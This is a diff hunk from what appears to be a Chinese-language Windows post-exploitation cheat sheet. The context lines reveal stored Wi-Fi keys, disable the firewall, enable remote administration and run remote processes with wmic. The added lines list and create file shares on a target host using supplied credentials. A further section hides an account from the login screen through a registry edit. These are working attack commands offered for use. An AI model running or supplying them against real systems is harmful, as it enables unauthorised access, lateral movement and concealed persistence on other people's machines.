@@ -405,6 +405,8 @@ netsh wlan show profile name="WLAN-NAME" key=clear
 netsh advfirewall set currentprofile state off  关闭防火墙
 netsh firewall set service RemoteAdmin enable  开启远程管理
 wmic /node:[ip] /user:[用户名] /password:[密码] process call create "[指令]"
+wmic /node:[ip] /user:[用户名] /password:[密码] share list  查看目标主机文件夹共享
+wmic /node:[ip] /user:[用户名] /password:[密码] share call create “”,"Description","MaximumAllowed","Name","","Path",0  开启目标主机指定文件夹共享
 
 (8)登陆界面隐藏账户
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v [username] /t REG_DWORD /d 0
